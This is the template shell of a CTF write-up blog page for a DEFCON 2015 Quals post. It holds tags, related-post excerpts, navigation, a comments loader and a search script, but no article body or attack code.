    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag" href="/tags/python/">Python</a>
      
        
        <a class="post-tag" href="/tags/pwnable/">Pwnable</a>
      
        
        <a class="post-tag" href="/tags/ppc/">PPC</a>
      
        
        <a class="post-tag" href="/tags/heap/">heap</a>
      
        
        <a class="post-tag" href="/tags/reversing/">Reversing</a>
      
        
        <a class="post-tag" href="/tags/asis/">ASIS</a>
      
        
        <a class="post-tag" href="/tags/c/">C</a>
      
        
        <a class="post-tag" href="/tags/format-string/">format_string</a>
      
        
        <a class="post-tag" href="/tags/33c3/">33C3</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/ais3-2015-pre-exam-complete-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Aug  6, 2015
  

  <i class="unloaded">2015-08-06T20:15:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>AIS3 2015 pre-exam -- complete writeup</h3>
            <div class="text-muted small">
              <p>
                





                考量到參與 AIS3 2015 pre-exam 的人幾乎都是台灣人
這個 blog 的第一篇中文 writeup 就獻給這篇了 XD
基本上就是全包這次 exam 的所有題目
有問題歡迎留言討論



MISC
MISC1
沒啥特別，範例 flag AIS3{hello_world}

MISC2
給了一個 facebook.zip，有密碼
老實說我最討厭這種需要解壓縮檔密碼的題目 = =...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/asis-ctf-2015-quals-saw-this-1/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May 23, 2015
  

  <i class="unloaded">2015-05-23T06:37:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>ASIS CTF 2015 Quals -- Saw this (1 & 2)</h3>
            <div class="text-muted small">
              <p>
                





                Category: pwn
Points: 100 (Saw this-1), 400 (Saw this-2)


  Survive and get the flag!
Note: This challenge contains two flags, one of them is easier to fetch, the other is harder. 
The easier flag...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/defcon-ctf-2015-quals-catwestern/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May 24, 2015
  

  <i class="unloaded">2015-05-24T06:39:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>DEFCON CTF 2015 Quals -- catwestern</h3>
            <div class="text-muted small">
              <p>
                





                Category: Coding Challenge
Points: 1

  meow
catwestern_631d7907670909fc4df2defc13f2057c.quals.shallweplayaga.me 9999




Interesting challenge. First we connect to the service, it will send us the...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/defcon-ctf-2015-quals-catwestern/" class="btn btn-outline-primary"
    prompt="Older">
    <p>DEFCON CTF 2015 Quals -- catwestern</p>
  </a>
  

  
  <a href="/ais3-2015-pre-exam-complete-writeup/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>AIS3 2015 pre-exam -- complete writeup</p>
  </a>
  

</div>


    
      <!--
  The Disqus lazy loading.
  Powered by: <https://github.com/osvaldasvalutis/disqusLoader.js>
-->

<div id="disqus" class="pt-2 pb-2">
  <p class="text-center text-muted small pb-5">
    Comments powered by <a href="https://disqus.com/">Disqus</a>.
  </p>
</div>

<script src="/assets/js/lib/jquery.disqusloader.min.js"></script>
<script>
  const options = {
    scriptUrl: '//bruce30262logdown.disqus.com/embed.js',

    disqusConfig: function() {
      this.page.title = 'DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey';
      this.page.url = 'http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/';
      this.page.identifier = '/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/';
    }
  };

  $.disqusLoader('#disqus', options);
</script>

    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2021
        <a href="https://twitter.com/bruce30262">Bruce Chen</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">All rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag" href="/tags/python/">Python</a>
      
        
        <a class="post-tag" href="/tags/pwnable/">Pwnable</a>
      
        
        <a class="post-tag" href="/tags/ppc/">PPC</a>
      
        
        <a class="post-tag" href="/tags/heap/">heap</a>
      
        
        <a class="post-tag" href="/tags/reversing/">Reversing</a>
      
        
        <a class="post-tag" href="/tags/asis/">ASIS</a>
      
        
        <a class="post-tag" href="/tags/c/">C</a>
      
        
        <a class="post-tag" href="/tags/format-string/">format_string</a>
      
        
        <a class="post-tag" href="/tags/33c3/">33C3</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://0.0.0.0:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

